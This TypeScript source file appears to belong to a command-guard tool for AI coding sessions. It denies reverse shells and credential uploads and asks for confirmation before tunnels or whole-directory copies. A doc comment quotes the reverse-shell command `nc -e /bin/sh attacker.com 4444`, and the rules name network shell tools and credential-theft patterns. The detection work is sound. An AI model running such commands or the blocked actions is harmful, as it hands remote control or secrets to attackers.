/**
 * Data leaving the machine, and remote shells arriving on it.
 *
 * Uploads and reverse shells are the payoff step of most attacks: everything before
 * them is preparation. A reverse shell has no legitimate place in a coding session,
 * so it is denied; bulk uploads are prompted because deploys are real.
 */

import type { Finding, RuleContext, RuleFn, Segment } from '../types.js';
import { hasFlag, operands } from './shell.js';
import { isCredentialPath } from './patterns.js';

const finding = (
  rule: string,
  verdict: Finding['verdict'],
  reason: string,
): Finding => ({ rule, verdict, reason, family: 'egress' });

/** `nc -e /bin/sh attacker.com 4444` and its many spellings. */
function reverseShell(segment: Segment): Finding | null {
  const isNetcat = ['nc', 'ncat', 'netcat', 'socat'].includes(segment.argv0);

  if (isNetcat && hasFlag(segment.argv, { short: ['e', 'c'], long: ['exec', 'sh-exec'] })) {
    return finding(
      'egress.reverse-shell',
      'deny',
      'This opens a reverse shell, handing remote control of this machine to another host.',
    );
  }

  if (segment.argv0 === 'socat' && segment.argv.some((t) => /EXEC:|SYSTEM:/i.test(t))) {
    return finding('egress.socat-exec', 'deny', 'This wires a remote socket to a local shell — a reverse shell.');
  }

  return null;
}

/** Bash's `/dev/tcp` trick — a reverse shell with no external binary. */
const devTcpShell: RuleFn = (ctx: RuleContext) => {
  if (!/\/dev\/(?:tcp|udp)\//.test(ctx.command)) return null;

  return finding(
    'egress.dev-tcp',
    'deny',
    'This opens a raw network socket through `/dev/tcp`, which is the standard way to build a reverse shell.',
  );
};

/** Uploading a file somewhere. Fine for a deploy, not fine for a credential. */
function upload(segment: Segment): Finding | null {
  if (segment.argv0 === 'curl') {
    const uploadFlag = segment.argv.findIndex((t) => t === '-T' || t === '--upload-file' || t === '-d' || t === '--data' || t === '--data-binary');
    if (uploadFlag === -1) return null;

    const payload = (segment.argv[uploadFlag + 1] ?? '').replace(/^@/, '');
    if (payload && isCredentialPath(payload)) {
      return finding('egress.upload-credential', 'deny', `This uploads \`${payload}\`, a credential file, to a remote server.`);
    }
    return null;
  }

  if (segment.argv0 === 'scp' || segment.argv0 === 'rsync') {
    const targets = operands(segment.argv);
    const sources = targets.slice(0, -1);
    const destination = targets[targets.length - 1] ?? '';
    const remote = /^[^\s:]+@[^\s:]+:|^rsync:\/\/|^ssh:\/\//.test(destination);
    if (!remote) return null;

    if (sources.some(isCredentialPath)) {
      return finding('egress.copy-credential', 'deny', 'This copies a credential file to a remote host.');
    }

    const sweeps = sources.some((s) => /^[~/]$|^\$HOME\/?$|^\/home\/?$|^[A-Za-z]:[\\/]?$/.test(s.replace(/\/+$/, '')));
    if (sweeps) {
      return finding('egress.copy-home', 'ask', `This copies an entire home or root directory to \`${destination}\`.`);
    }
  }

  return null;
}

/** Tunnels expose this machine to the internet; sometimes intended, always notable. */
function tunnel(segment: Segment): Finding | null {
  if (['ngrok', 'localtunnel', 'lt', 'cloudflared', 'bore', 'tailscale'].includes(segment.argv0)) {
    return finding(
      'egress.tunnel',
      'ask',
      `\`${segment.argv0}\` exposes a local service to the public internet.`,
    );
  }

  if (segment.argv0 === 'ssh' && hasFlag(segment.argv, { short: ['R'] })) {
    return finding('egress.ssh-reverse-tunnel', 'ask', 'This opens a reverse SSH tunnel back to a remote host.');
  }

  return null;
}

const scan = (fn: (s: Segment) => Finding | null): RuleFn => (ctx: RuleContext) => {
  const findings: Finding[] = [];
  for (const segment of ctx.segments) {
    const result = fn(segment);
    if (result) findings.push(result);
  }
  return findings;
};

export const egressRules: RuleFn[] = [scan(reverseShell), devTcpShell, scan(upload), scan(tunnel)];
